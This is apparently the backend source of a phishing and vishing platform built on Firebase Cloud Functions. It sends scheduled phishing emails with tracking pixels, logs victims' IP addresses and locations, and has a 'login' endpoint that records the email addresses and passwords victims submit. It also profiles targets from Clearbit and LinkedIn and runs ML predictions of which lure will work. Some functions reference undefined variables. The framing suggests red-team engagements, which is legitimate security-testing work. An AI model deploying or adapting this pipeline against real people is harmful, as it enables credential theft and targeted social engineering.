const functions = require('firebase-functions')
const parse = require('csv-parse')
const gcs = require('@google-cloud/storage')()
const spawn = require('child-process-promise').spawn;
const path = require('path')
const os = require('os')
const util = require('util')
const fs = require('fs')
var csvWriter = require('csv-write-stream')

const nodemailer = require('nodemailer')
const endpointURL = 'REPLACEME' //TODO << replace with the https endploint url that you get set up
const clearBitToken = 'REPLACEME' //TODO << replace with a clearbit token
const basicAuth = 'REPLACEME' //TODO << replace with a basic auth combo of your basic auth username and password
const myBucket = 'REPLACEME.appspot.com' //TODO << replace with your bucket default url
var clearbit = require('clearbit')(clearBitToken)
const request = require('request')

const admin = require('firebase-admin')
admin.initializeApp()

exports.fixImages = functions.storage.object().onFinalize((object) => {
  const fileBucket = object.bucket; // The Storage bucket that contains the file.
  const filePath = object.name; // File path in the bucket.
  const contentType = object.contentType; // File content type.
  const metageneration = object.metageneration; // Number of times metadata has been generated. New objects have a value of 1.

  // Exit if this is triggered on a file that is not an image.
  if (!contentType.startsWith('image/')) {
    console.log('This is not an image.');
    return null;
  }

  // Get the file name.
  const fileName = path.basename(filePath);
  // Exit if the image is already a thumbnail.
  if (fileName.startsWith('fixed_')) {
    console.log('Already fixed.');
    return null;
  }

  // Download file from bucket.
  const bucket = gcs.bucket(fileBucket);
  const tempFilePath = path.join(os.tmpdir(), fileName);
  const metadata = {
    contentType: contentType,
  };
  return bucket.file(filePath).download({
    destination: tempFilePath,
  }).then(() => {
    console.log('Image downloaded locally to', tempFilePath);
    return spawn('convert', [tempFilePath, '-trim', tempFilePath]);
  }).then(() => {
    console.log('Fixed image created at', tempFilePath);
    const thumbFileName = `fixed_${fileName}`;
    const thumbFilePath = path.join(path.dirname(filePath), thumbFileName);
    return bucket.upload(tempFilePath, {
      destination: thumbFilePath,
      metadata: metadata,
    });
  }).then(() => fs.unlinkSync(tempFilePath));

});

exports.getCompanyLogo = functions.firestore
  .document('companies/{companyID}')
  .onCreate((snap, context) => {

    const company = snap.data()
    if (company.domainName) {
      var options = {
        method: 'GET',
        url: `https://logo.clearbit.com/${company.domainName}`,
        headers: {
          'Cache-Control': 'no-cache'
        }
      };

      const tryGetLogo = request(options, function (error, response, body) {
        if (error) {
          throw new Error(error);
        } else {


          var clientRef = admin
            .firestore()
            .collection('companies')
            .doc(context.params.companyID)

          const copyOver = clientRef.set({
            imgUrl: `https://logo.clearbit.com/${company.domainName}`
          }, {
              merge: true
            })


          console.log("got logo");

        }


      });

      return tryGetLogo


    } else {
      return console.log("NO DOMAIN NAME")
    }
  })












exports.emailopened = functions.https.onRequest((req, res) => {
  console.log(req)
  console.log(req.query)
  console.log(req.query.attackID)
  const attackID = req.query.attackID


  const setLog = admin
    .firestore()
    .collection('logs')
    .add({
      attackID: req.query.attackID,

      dateAdded: new Date(),
      type: 'emailOpened'
    })

  Promise.all([setLog]).then(() => {
    res.status(200).send('some text')
  })

})








exports.minutely_job = functions.pubsub
  .topic('minutely-tick')
  .onPublish(event => {
    var nowMin = new Date().getTime() / 1000
    var nextMin = nowMin + 70


    const sendScheduled = admin.firestore().collection('attacks').where('strictTime', '>', new Date(nowMin * 1000)).where('strictTime', '<', new Date(nextMin * 1000)).get().then(querySnapshot => {

      querySnapshot.forEach(scheduledEmail => {
        var email = scheduledEmail.data()
        if (email.status === 'scheduled') {
          var eBlob = email.template;

          const sendMail = admin.firestore().collection('smtpservers').doc(email.template.smtpServer).get().then(doc => {


            const serverBlob = doc.data()
            const mailTransport = nodemailer.createTransport({
              host: serverBlob.hostname,
              port: parseInt(serverBlob.port, 10),
              secure: serverBlob.secure,
              auth: {
                user: serverBlob.username,
                pass: serverBlob.password
              }
            })
            const mailOptions = {
              from: `${eBlob.fromName} <${eBlob.fromAddress}>`,
              to: email.target.email,
              subject: eBlob.subjectLine,
              text: eBlob.template,
              html: eBlob.template + `<img src='https://CHANGEME.cloudfunctions.net/emailopened?attackID=${email.id}'>` //TODO << fix this
            }

            return mailTransport.sendMail(mailOptions).then(result => {
              console.log(result);

            })


          })
          return sendMail.then(result => {
            console.log(result);

            const updateLog = admin.firestore().collection('logs').add({
              attackID: scheduledEmail.id,
              dateAdded: new Date(),
              type: 'emailSent'
            })

            const updateAttack = admin.firestore().doc(`attacks/${scheduledEmail.id}`).set({
              status: 'sent'
            }, {
                merge: true
              })

            Promise.all([updateLog, updateAttack])

          })
        }

      })

    })
    return sendScheduled.then(result => {
      console.log(result);

    })





  })


exports.createTrainingSetup = functions.firestore
  .document('conversions/{templateID}')
  .onCreate((snap, context) => {
    const templateID = context.params.templateID


    var options = {
      method: 'POST',
      url: `${endpointURL}/setup`,
      headers: {
        'Cache-Control': 'no-cache',
        Authorization: `Basic ${basicAuth}`,
        'Content-Type': 'application/json'
      },
      body: {
        templateID: templateID
      },
      json: true
    };


    const setupTemplate = request(options, function (error, response, body) {
      if (error) throw new Error(error);

      console.log(body);
    });

    return setupTemplate;





  })

exports.updateSpreadsheet = functions.firestore
  .document('conversions/{templateID}/eventLogs/{conversionID}')
  .onCreate((snap, context) => {
    const conversion = snap.data()
    const templateID = context.params.templateID
    const conversionID = context.params.conversionID

    const grabTemplateData = admin.firestore().collection('conversions').doc(templateID).get().then(doc => {
      const template = doc.data()

      if (template.status === 'new') {


        const dirPath = `conversions/${templateID}/`


        const bucket = gcs.bucket(myBucket);
        const fileName = `${templateID}-${conversionID}.csv`
        const tempFilePath = path.join(os.tmpdir(), fileName);

        var writer = csvWriter({
          headers: ["company", "position", "major", "college", "firstname", "lastname", "location", "result"]
        });

        writer.pipe(fs.createWriteStream(tempFilePath, {
          flags: 'a'
        }));
        writer.write({
          company: conversion.target.company,
          position: conversion.target.position,
          major: conversion.target.major,
          college: conversion.target.college,
          firstname: conversion.target.firstname,
          lastname: conversion.target.lastname,
          location: conversion.target.location,
          result: conversion.result
        });
        writer.end();

        const updatedFilePath = path.join(`conversions/${templateID}/`, fileName);

        const metadata = {
          contentType: 'text/csv',
        };
        return bucket.upload(tempFilePath, {
          destination: updatedFilePath,
          metadata: metadata,
        }).then(() => {
          newCSV = dirPath + fileName
          const updateCSV = admin.firestore().collection('conversions').doc(templateID).set({
            lastUpdatedCSV: newCSV,
            status: 'notNew'
          }, {
              merge: true
            })

          return updateCSV.then(doc1 => {
            console.log('csv updated: ', doc1.id);

            var options = {
              method: 'POST',
              url: `${endpointURL}/retrain`,
              headers: {
                'Cache-Control': 'no-cache',
                Authorization: `Basic ${basicAuth}`,
                'Content-Type': 'application/json'
              },
              body: {
                templateID: templateID
              },
              json: true
            };

            const askRetrain = request(options, function (error, response, body) {
              if (error) throw new Error(error);

              console.log(body);
            });

            return askRetrain;


          })
        }).then(() => {
          fs.unlinkSync(tempFilePath)
        })



      } else {

        const lastUpdatedCSV = template.lastUpdatedCSV



        const dirPath = `conversions/${templateID}/`


        const bucket = gcs.bucket(myBucket);
        const fileName = `${templateID}-${conversionID}.csv`
        const tempFilePath = path.join(os.tmpdir(), fileName);


        return bucket.file(lastUpdatedCSV).download({
          destination: tempFilePath,
        }).then(() => {




          var writer = csvWriter({
            sendHeaders: false
          });

          writer.pipe(fs.createWriteStream(tempFilePath, {
            flags: 'a'
          }));
          writer.write({
            company: conversion.target.company,
            position: conversion.target.position,
            major: conversion.target.major,
            college: conversion.target.college,
            firstname: conversion.target.firstname,
            lastname: conversion.target.lastname,
            location: conversion.target.location,
            result: conversion.result
          });
          return writer.end();





        }).then(() => {
          const updatedFilePath = path.join(`conversions/${templateID}/`, fileName);

          const metadata = {
            contentType: 'text/csv',
          };
          return bucket.upload(tempFilePath, {
            destination: updatedFilePath,
            metadata: metadata,
          }).then(() => {
            newCSV = dirPath + fileName
            const updateCSV = admin.firestore().collection('conversions').doc(templateID).set({
              lastUpdatedCSV: newCSV
            }, {
                merge: true
              })

            return updateCSV.then(doc1 => {
              console.log('csv updated: ', doc1.id);

              var options = {
                method: 'POST',
                url: `${endpointURL}/retrain`,
                headers: {
                  'Cache-Control': 'no-cache',
                  Authorization: `Basic ${basicAuth}`,
                  'Content-Type': 'application/json'
                },
                body: {
                  templateID: templateID
                },
                json: true
              };

              const askRetrain = request(options, function (error, response, body) {
                if (error) throw new Error(error);

                console.log(body);
              });

              return askRetrain;


            })
          })




        }).then(() => fs.unlinkSync(tempFilePath));


      }





    })

    return grabTemplateData;









  })

exports.sendIt = functions.firestore.document('attacks/{attackID}').onUpdate((change, context) => {
  const attack = change.after.data()
  const attackRef = change.after.ref
  const status = attack.status
  if (status === 'callAttacker') {
    var options = {
      method: 'POST',
      url: `${endpointURL}/call`,
      headers: {
        'Cache-Control': 'no-cache',
        Authorization: `Basic ${basicAuth}`,
        'Content-Type': 'application/json'
      },
      body: {
        attackID: context.params.attackID
      },
      json: true
    };

    const placeCall = request(options, function (error, response, body) {
      if (error) throw new Error(error);

      console.log(body);
    });

    return placeCall;

  } else if (status === 'sendEmail') {



    var eBlob = attack.template;

    const sendMail = admin.firestore().collection('smtpservers').doc(attack.template.smtpServer).get().then(doc => {


      const serverBlob = doc.data()
      const mailTransport = nodemailer.createTransport({
        host: serverBlob.hostname,
        port: parseInt(serverBlob.port, 10),
        secure: serverBlob.secure,
        auth: {
          user: serverBlob.username,
          pass: serverBlob.password
        }
      })
      const mailOptions = {
        from: `${eBlob.fromName} <${eBlob.fromAddress}>`,
        to: attack.target.email,
        subject: eBlob.subjectLine,
        text: eBlob.template,
        html: eBlob.template + `<img src='https://REPLACEME.cloudfunctions.net/emailopened?attackID=${context.params.attackID}'>` //TODO get this url when you deplay the cloud function.
      }

      return mailTransport.sendMail(mailOptions).then(result => {
        console.log(result);

      })


    })
    return sendMail.then(result => {
      console.log(result);

      const updateLog = admin.firestore().collection('logs').add({
        attackID: context.params.attackID,
        dateAdded: new Date(),
        type: 'emailSent'
      })

      const updateAttack = admin.firestore().doc(`attacks/${context.params.attackID}`).set({
        status: 'sent'
      }, {
          merge: true
        })

      Promise.all([updateLog, updateAttack])

    })

  }
})



exports.testEmailAttack = functions.firestore
  .document('testAttacks/{attackID}')
  .onCreate((snap, context) => {
    attackBlob = snap.data()
    const targetEmail = attackBlob.targetEmail

    const targetName = attackBlob.targetName

    const templateID = attackBlob.templateID
    var templateRef = admin
      .firestore()
      .collection('emailTemplates')
      .doc(templateID)

    var getTemplate = templateRef
      .get()
      .then(doc => {
        if (!doc.exists) {
          console.log('No such document!')
        } else {
          console.log('Document data:', doc.data())
        }
        const template = doc.data()


        const finalTemplate = doc
          .data()
          .template.replace('${targetName}', targetName)
        console.log(finalTemplate)
        const passobj = {
          fromAddress: template.fromAddress,
          fromName: template.fromName,
          subjectLine: template.subjectLine,
          finalTemplate: finalTemplate,
          serverID: template.smtpServer
        }

        return passobj
      })
      .then(obj => {
        console.log(obj.serverID)

        const sendMail = admin
          .firestore()
          .collection('smtpservers')
          .doc(obj.serverID)
          .get()
          .then(doc => {
            const serverBlob = doc.data()
            const mailTransport = nodemailer.createTransport({
              host: serverBlob.hostname,
              port: parseInt(serverBlob.port, 10),
              secure: serverBlob.secure,
              auth: {
                user: serverBlob.username,
                pass: serverBlob.password
              }
            })
            const mailOptions = {
              from: `${obj.fromName} <${obj.fromAddress}>`,
              to: targetEmail,
              subject: obj.subjectLine,
              text: obj.finalTemplate,
              html: obj.finalTemplate
            }

            return mailTransport.sendMail(mailOptions)
          })
        return sendMail
      })
      .catch(err => {
        console.log('Error getting document', err)
      })
    return getTemplate
  })

exports.logFollowUp = functions.firestore
  .document('logs/{logID}')
  .onCreate((snap, context) => {

    const log = snap.data()
    if (log.type === 'call' && log.status === 'callEnded') {
      console.log('confirms both');

      var options = {
        method: 'POST',
        url: `${endpointURL}/upCall`,
        headers: {
          'Cache-Control': 'no-cache',
          Authorization: `Basic ${basicAuth}`,
          'Content-Type': 'application/json'
        },
        body: {
          logID: context.params.logID
        },
        json: true
      };

      const askRec = request(options, function (error, response, body) {
        if (error) throw new Error(error);

        console.log(body);
      });

      return askRec;
    } else {
      console.log('LogAdded: ', log);
    }

    if (log.attackID && !log.targetID) {
      const getTarget = admin.firestore().doc(`attacks/${log.attackID}`).get().then(doc => {
        const targetID = doc.data().targetID
        const updateWithTarget = snap.ref.set({
          targetID: targetID
        }, {
            merge: true
          })
        return updateWithTarget
      })
      return getTarget

    }
  });



exports.updateCall = functions.https.onRequest((req, res) => {
  console.log(req)
  console.log(req.query)
  console.log(req.query.attackID)
  console.log(req.query.status)
  const attackID = req.query.attackID


  if (req.query.status === 'callEnded') {

    const setLog = admin
      .firestore()
      .collection('logs')
      .add({
        attackID: req.query.attackID,
        status: req.query.status,
        dateAdded: new Date(req.query.ts * 1000),
        type: 'call'
      })

    const updateAttack = admin
      .firestore()
      .collection('attacks')
      .doc(req.query.attackID)
      .set({
        status: "waitingResult"
      }, {
          merge: true
        })

    Promise.all([setLog, updateAttack]).then(() => {
      res.status(200).send('some text')
    })


  } else if (req.query.status === 'callingTarget') {
    const setLog = admin
      .firestore()
      .collection('logs')
      .add({
        attackID: req.query.attackID,
        status: req.query.status,
        dateAdded: new Date(req.query.ts * 1000),
        type: 'call'
      })

    const updateAttack = admin
      .firestore()
      .collection('attacks')
      .doc(req.query.attackID)
      .set({
        status: "callingTarget"
      }, {
          merge: true
        })

    Promise.all([setLog, updateAttack]).then(() => {
      res.status(200).send('some text')
    })
  }






})

exports.minuteChecker = functions.https.onRequest((req, res) => {


  console.log('Another minute tick!')

  const result = res.status(200).send('some text')

  return result

})






exports.analytics = functions.https.onRequest(async (req, res) => {
  const attackID = req.query.aID
  const writeResult = await admin
    .firestore()
    .collection('logs')
    .add({
      attackID: attackID,
      dateAdded: new Date(),
      city: req.headers['x-appengine-city'],
      ipAddress: req.headers['x-appengine-user-ip'],
      city: req.headers['x-appengine-city'],
      userAgent: req.headers['user-agent'],
      type: 'lpOpened',
      rawHeaders: req.headers
    })
  res.json({
    result: `pwned`
  })
})

exports.login = functions.https.onRequest(async (req, res) => {
  const formData = req.body
  console.log(formData);
  const attackID = formData.aID
  const email = formData.email
  const password = formData.password
  const writeResult = await admin
    .firestore()
    .collection('logs')
    .add({
      attackID: attackID,
      dateAdded: new Date(),
      credsEmail: email,
      credsPW: password,
      city: req.headers['x-appengine-city'],
      ipAddress: req.headers['x-appengine-user-ip'],
      city: req.headers['x-appengine-city'],
      userAgent: req.headers['user-agent'],
      type: 'creds',
      rawHeaders: req.headers
    })
  const updateAttack = await admin
    .firestore()
    .collection('attacks')
    .doc(attackID)
    .set({
      status: 'creds',
      credsEmail: email,
      credsPW: password
    }, {
        merge: true
      })

  res.json({
    result: `loaded`
  })
})



exports.copyEgToTarget = functions.firestore
  .document('engagements/{engagementID}/targets/{targetID}')
  .onCreate((snap, context) => {

    egTargetBlob = snap.data()

    const engagementID = context.params.engagementID
    const targetID = context.params.targetID
    var egRef = admin
      .firestore()
      .collection('targets')
      .doc(targetID)
      .collection('engagements')
      .doc(engagementID)

    const copyOver = egRef.set({
      vishing: egTargetBlob.vishing,
      phishing: egTargetBlob.phishing
    }, {
        merge: true
      })
    console.log('Copied from Engagement.Targets to Targets.Target.Engagements')

    return copyOver
  })

exports.copyAttackLink = functions.firestore
  .document('attacks/{attackID}')
  .onCreate((snap, context) => {
    const attackBlob = snap.data()
    const attackRef = snap.ref
    const egID = attackBlob.target.addedOnEngagementID
    const targetID = attackBlob.targetID
    const attackID = context.params.attackID
    var targetRef = admin
      .firestore()
      .collection('engagements')
      .doc(egID)
      .collection('targets')
      .doc(targetID)






    if (attack.type === 'phishing') {

      //TODO: find out how we can get the url of a particular cloud function, using cloud functions. we need to set this as the url below.
      const analyticsUrl = 'https://FIXME.com'

      var lpUrl = `${attack.template.domain}/${attack.template.tail}${attackID}`
      var trackingPixel = `<img src="${analyticsUrl}/?aID=${attackID}"></html>`

      const tokens = [
        '${fullName}', '${firstName}', '${lastName}', '${phoneNumber}', '${emailAddress}', '${landingPage}', '</html>'
      ]

      const replacements = [
        target.fullName, target.firstName, target.lastName, target.phoneNumber, target.email, lpUrl, trackingPixel
      ]

      //need to switch out any tokens in subject line
      var preSubject = attack.template.subjectLine
      var subjectLine = preSubject

      //switch out any tokens in email body
      var preTemplate = attack.template.content
      var template = preTemplate

      //TODO: we need to account for the template content not having opening and closing html tags
      tokens.forEach(token => {
        subjectLine = subjectLine.replace(token, replacements[tokens.indexOf(token)])
        template = template.replace(token, replacements[tokens.indexOf(token)])
      });

      //set the new values
      const copyOver = targetRef.set({
        phishingAttackLink: attackID
      }, {
          merge: true
        })
      console.log(
        'Copied link for attack from Attacks to Engagements.eID.Targets.tID'
      )

      const updateAttack = attackRef.template.set({
        content: template,
        subjectLine: subjectLine
      }, {
          merge: true
        })
      console.log('Phishing template/subjectLine tokens replaced.')

      Promise.all([updateAttack, copyOver])


    } else if (attack.type === 'vishing') {
      //token replacements for vishing

      const tokens = [
        '${fullName}', '${firstName}', '${lastName}', '${phoneNumber}', '${emailAddress}'
      ]

      const replacements = [
        target.fullName, target.firstName, target.lastName, target.phoneNumber, target.email
      ]

      //switch out any tokens in email body
      var preTemplate = attack.script.content
      var template = preTemplate

      tokens.forEach(token => {
        template = template.replace(token, replacements[tokens.indexOf(token)])
      });


      const updateAttack = attackRef.script.set({
        content: template,
      }, {
          merge: true
        })
      console.log('Vishing script tokens replaced.')


      const copyOver = targetRef.set({
        vishingAttackLink: attackID
      }, {
          merge: true
        })

      const canRecordStatus = admin
        .firestore()
        .collection('companies')
        .doc(attackBlob.company).get().then(doc => {
          const recordStatus = doc.data().canRecord
          return recordStatus
        })


      Promise.all([copyOver, canRecordStatus, updateAttack]).then(results => {
        attackRef.set({
          canRecord: results[1]
        }, {
            merge: true
          })
      })

    }


  })

exports.launchedEngagement = functions.firestore
  .document('targets/{targetID}')
  .onUpdate((change, context) => {
    const engagement = change.after.data()
    const egRef = change.after.ref
    if (engagement.status === 'launch') {

    }
  })

exports.osintQueue = functions.firestore
  .document('osintQueue/{targetID}')
  .onCreate((snap, context) => {


  })

exports.osintQueueUpdate = functions.firestore
  .document('osintQueue/{targetID}')
  .onUpdate((change, context) => {
    const target = change.after.data()
    if (target.status === 'completed') {
      const startNext = admin.firestore().collection('osintQueue').where('status', '==', 'waiting').orderBy('timeAdded').limit(1).get().then(querySnapshot => {

        querySnapshot.forEach(nextTarget => {
          console.log(nextTarget.data());

          var nextTargetID = nextTarget.id
          var options = {
            method: 'POST',
            url: `${endpointURL}/osint`,
            headers: {
              'Cache-Control': 'no-cache',
              Authorization: `Basic ${basicAuth}`,
              'Content-Type': 'application/json'
            },
            body: {
              targetID: nextTargetID
            },
            json: true
          };
          const updateStatus = nextTarget.ref.set({
            status: 'started'
          }, {
              merge: true
            })
          const osintReq = request(options, function (error, response, body) {
            if (error) throw new Error(error);

            console.log(body);
          });
          Promise.all([updateStatus, osintReq])
        })
      })


      return startNext


    }
  })

exports.hasLinkedIn = functions.firestore
  .document('targets/{targetID}')
  .onUpdate((change, context) => {
    const target = change.after.data()
    const targetRef = change.after.ref
    if (target.linkedInURL && target.liStatus === 'notChecked') {
      console.log('starting LI osint with URL');

      //check if anything in the queue
      const checkWaiting = admin.firestore().collection('osintQueue').where('status', '==', 'waiting').get().then(querySnapshot => {
        return querySnapshot.size
      })

      const checkStarted = admin.firestore().collection('osintQueue').where('status', '==', 'started').get().then(querySnapshot => {
        return querySnapshot.size
      })

      Promise.all([checkWaiting, checkStarted]).then(results => {
        if ((results[0] + results[1]) < 1) {

          //we can just push the req
          var options = {
            method: 'POST',
            url: `${endpointURL}/osint`,
            headers: {
              'Cache-Control': 'no-cache',
              Authorization: `Basic ${basicAuth}`,
              'Content-Type': 'application/json'
            },
            body: {
              targetID: context.params.targetID
            },
            json: true
          };

          const osintReq = request(options, function (error, response, body) {
            if (error) throw new Error(error);

            console.log(body);
          });

          const addToQueue = admin.firestore().collection('osintQueue').doc(context.params.targetID).set({
            status: 'started',
            timeAdded: new Date()
          }, {
              merge: true
            })


          Promise.all([addToQueue, osintReq])
        } else {
          const addToQueue = admin.firestore().collection('osintQueue').doc(context.params.targetID).set({
            status: 'waiting',
            timeAdded: new Date()
          }, {
              merge: true
            })
          Promise.all([addToQueue])
        }
      })




    } else if (target.liStatus === 'checked' && target.special === 'conversionPendingOSINT') {

      const grabPendingConversions = admin.firestore().collection('conversionsPendingOSINT').where('email', '==', target.email).get().then(querySnapshot => {
        querySnapshot.forEach(conversion => {
          var cv = conversion.data()
          cv.id = conversion.id

          var firstname
          var lastName
          if (target.name) {
            firstname = target.name.split(" ")[0]
            lastName = target.name.split(" ")[1]
          } else if (target.fullName) {
            firstname = target.fullName.split(" ")[0]
            lastName = target.fullName.split(" ")[1]
          }

          var tempObject = {
            result: cv.result,
            target: {
              company: target.jobs[0].company,
              position: target.jobs[0].position,
              major: target.edus[0].major,
              college: target.edus[0].schoolName,
              firstname: firstName,
              lastname: lastName,
              location: target.location,
            }
          }

          const copyConversion = admin.firestore().collection('conversions').doc(cv.template).collection('eventLogs').add(tempObject)
          return copyConversion


        })

      })

      return grabPendingConversions

    } else if (target.liStatus === 'checked') {
      const updateQueue = admin.firestore().doc(`osintQueue/${context.params.targetID}`).set({
        status: 'completed'
      }, {
          merge: true
        })

      return updateQueue

    } else {
      const result = console.log('nope: ', target.linkedInURL, target.liStatus)
      return result
    }
  })

exports.attackFlow = functions.firestore
  .document('targets/{targetID}')
  .onUpdate((change, context) => {
    const targetBlob = change.after.data()

    const theRef = change.after.ref
    const targetEmail = targetBlob.email
    const targetName = targetBlob.name
    const targetID = context.params.targetID
    if (
      targetBlob.mainStatus === 'Starting OSINT' ||
      targetBlob.mainStatus === 'Restarting OSINT'
    ) {

    } else if (targetBlob.mainStatus === 'Resuming OSINT') {
      //this is for jyang only

      console.log('OSINT done! Starting ML guess now.')

    } else if (targetBlob.mainStatus === 'OSINT Complete') {


      const mlStartResponse = theRef.set({
        mainStatus: 'Starting ML Prediction'
      }, {
          merge: true
        })

      return mlStartResponse.then(() => {

        var options = {
          method: 'POST',
          url: `${endpointURL}/predict`,
          headers: {
            'Cache-Control': 'no-cache',
            Authorization: `Basic ${basicAuth}`,
            'Content-Type': 'application/json'
          },
          body: {
            targetID: context.params.targetID
          },
          json: true
        };

        const predictReq = request(options, function (error, response, body) {
          if (error) throw new Error(error);

          console.log(body);
        });

        return predictReq

      })
    } else if (targetBlob.mainStatus === 'Starting ML Prediction') {



    } else if (targetBlob.mainStatus === 'Attack Ready') {


    }
  })

exports.startOSINT = functions.firestore
  .document('targets/{targetID}')
  .onCreate((snap, context) => {

    const targetBlob = snap.data()
    const targetEmail = targetBlob.email
    const targetName = targetBlob.name

    const targetID = context.params.targetID
    const startOSINT = snap.ref.set({
      mainStatus: 'Starting OSINT'
    }, {
        merge: true
      })



    return startOSINT.then(() => {
      if (clearBitToken != '') {
        var Person = clearbit.Person
        Person.find({
          email: targetEmail
        })
          .then(function (person) {
            //console.log('Name: ', person.name.fullName);
            console.log('Blob: ', person.linkedin.handle)
            var liURL = `https://www.linkedin.com/${person.linkedin.handle}`
            const updateWithLI = snap.ref.set({
              linkedInURL: liURL,
              liStatus: 'notChecked'
            }, {
                merge: true
              })

            return updateWithLI
          })
          .catch(Person.QueuedError, function (err) {
            console.log(err) // Person is queued
            const backupDetect = request(
              `${endpointURL}/detect/${targetID}`, {
                json: true
              },
              (err, res, body) => {
                if (err) {
                  return console.log(err)
                }
                console.log(body.url)
                console.log(body.explanation)
              }
            )

            return backupDetect
          })
          .catch(Person.NotFoundError, function (err) {
            console.log(err) // Person could not be found
            const backupDetect = request(
              `${endpointURL}/detect/${targetID}`, {
                json: true
              },
              (err, res, body) => {
                if (err) {
                  return console.log(err)
                }
                console.log(body.url)
                console.log(body.explanation)
              }
            )

            return backupDetect
          })
          .catch(function (err) {
            console.log(
              'Bad/invalid request, unauthorized, Clearbit error, or failed request'
            )
            const backupDetect = request(
              `${endpointURL}/detect/${targetID}`, {
                json: true
              },
              (err, res, body) => {
                if (err) {
                  return console.log(err)
                }
                console.log(body.url)
                console.log(body.explanation)
              }
            )
            return backupDetect
          })
      } else {
        //hoping they used their work email for LI
        const backupDetect = request(
          `${endpointURL}/detect/${targetID}`, {
            json: true
          },
          (err, res, body) => {
            if (err) {
              return console.log(err)
            }
            console.log(body.url)
            console.log(body.explanation)
          }
        )
        return backupDetect
      }
    })
  })